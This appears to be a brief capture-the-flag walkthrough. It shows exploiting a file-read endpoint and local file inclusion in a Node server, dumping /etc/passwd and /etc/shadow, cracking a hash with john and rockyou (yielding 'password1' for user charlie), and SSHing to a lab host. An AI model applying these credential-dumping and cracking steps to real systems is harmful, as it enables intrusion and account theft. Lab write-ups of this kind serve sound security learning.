1. By viewing source, we know we can get files from server by sending request to `/get-file/<filename>`. And there is a file called `server.js`.
```
function getNote(note, id) {
        const url = '/get-file/' + note.replace(/\//g, '%2f')
        $.getJSON(url,  function(data) {
          document.querySelector(id).innerHTML = data.info.replace(/(?:\r\n|\r|\n)/g, '<br>');
        })
      }
      // getNote('server.js', '#note-1')
```
2. We get the source code of server by `lfi.py`, and there is a lfi at `fs.readFileSync`.
3. We then dump `/etc/passwd` and `/etc/shadow` and crack it.
```
$ /opt/john/run/unshadow passwd shadow > shadow.hash
$ john shadow.hash --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (charlie)
1g 0:00:00:00 DONE (2021-06-23 17:12) 8.333g/s 4266p/s 4266c/s 4266C/s 123456..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
4. Finally, login via ssh and get flag!
```
$ ssh charlie@10.10.86.199
$ cat flag.txt
```
